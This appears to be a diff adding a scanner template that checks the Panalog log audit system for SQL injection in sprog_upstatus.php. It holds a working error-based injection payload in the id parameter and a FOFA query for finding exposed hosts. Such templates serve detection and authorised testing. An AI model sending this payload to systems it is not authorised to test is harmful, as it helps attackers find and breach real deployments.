@@ -1,0 +1,33 @@
+id: poc-yaml-panalog-sprog-upstatus-php-sqli
+info:
+  name: Panalog Log Audit System sprog_upstatus.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: Panabit Panalog
+    fofa: body="Maintain/cloud_index.php"
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Maintain/sprog_upstatus.php?status=1&rdb=1&id=1%20and%20updatexml(1,concat(0x7e,{{t2}},0x7e),1)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
+          - "{{substr(t2,0,31)}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
